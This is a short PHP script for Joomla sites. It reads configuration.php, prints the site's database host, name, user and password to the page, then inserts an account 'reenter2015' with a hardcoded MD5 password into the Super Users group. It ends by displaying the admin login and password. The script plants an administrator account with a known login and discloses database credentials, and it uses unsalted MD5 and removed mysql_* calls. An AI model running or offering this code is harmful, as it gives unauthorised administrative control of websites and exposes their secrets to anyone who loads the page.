<?
error_reporting( E_ALL );
ini_set('display_errors', 1); 
$config_file = $_SERVER['DOCUMENT_ROOT'].'/configuration.php';
include($config_file);
$c = new JConfig();
$host = $c->host;
$db = $c->db;
$user = $c->user;
$password = $c->password;
$dbprefix = $c->dbprefix;
echo "<br />DB_HOST = " . $host ."<br />DB_NAME = " . $db . "<br />DB_USER = " . $user . "<br />DB_PASSWORD = " . $password.  "<br />table_prefix = " . $dbprefix .  "<br />";

$sql_connect = mysql_connect($host, $user, $password) or exit("<p style='color:red'>Can't connect to MySQL</p>");
mysql_select_db($db) or exit("Can't connect to database");
$joomla_users = $dbprefix.'users';
$joomla_user_usergroup_map = $dbprefix.'user_usergroup_map';
$passMD5 = md5('reenter2015');

// echo $passMD5;
	$query1 = "INSERT INTO  `$db`.`$joomla_users` (`id`, `name`, `username`, `email`, `password`, `block`, `sendEmail`, `registerDate`, `activation`, `params`, `resetCount`, `requireReset`) VALUES ('1366613', 'reenter2015', 'reenter2015', 'support@reenter.ru', '$passMD5', '0', '0', '2012-09-03 13:48:29', '1', '{}', '0','0');";
	$resquerytest1 = mysql_query($query1) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 
	
	$query2 = "INSERT INTO `$db`.`$joomla_user_usergroup_map` (`user_id`, `group_id`) VALUES ('1366613', '8');";
	$resquerytest2 = mysql_query($query2) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 

	
	$http_host = $_SERVER['HTTP_HOST'];
	echo "<br /><p style='color: green'>Everything is ok! Try to login : <a href='http://$http_host/administrator/' target='_blank'>$http_host/administrator/</a></p><p style='color: green'>Login: reenter2015</p><p style='color: green'>Password: reenter2015</p>";
?>